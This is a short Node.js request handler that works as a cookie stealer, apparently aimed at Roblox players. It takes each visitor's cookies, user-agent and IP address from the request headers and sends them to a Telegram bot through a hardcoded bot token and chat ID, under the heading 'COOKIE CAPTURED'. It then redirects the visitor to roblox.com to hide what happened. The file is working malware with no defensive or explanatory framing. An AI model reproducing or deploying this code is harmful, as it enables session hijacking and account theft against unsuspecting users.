const fetch = require('node-fetch');

module.exports = async (req, res) => {
    const BOT_TOKEN = '8110179122:AAHjbqAglX75ElcuKCcKwRwwXYGCvwY4_xM';
    const CHAT_ID = '7695851744';
    
    try {
        const cookies = req.headers.cookie || 'No cookies';
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const ip = req.headers['x-forwarded-for'] || 'Unknown';

        const message = `🔴 COOKIE CAPTURED
📧 Cookies: ${cookies}
🌐 User-Agent: ${userAgent}
📍 IP: ${ip}
⏰ Time: ${new Date().toLocaleString()}`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });

        res.writeHead(302, { 'Location': 'https://www.roblox.com/' });
        res.end();
        
    } catch (error) {
        res.writeHead(302, { 'Location': 'https://www.roblox.com/' });
        res.end();
    }
};
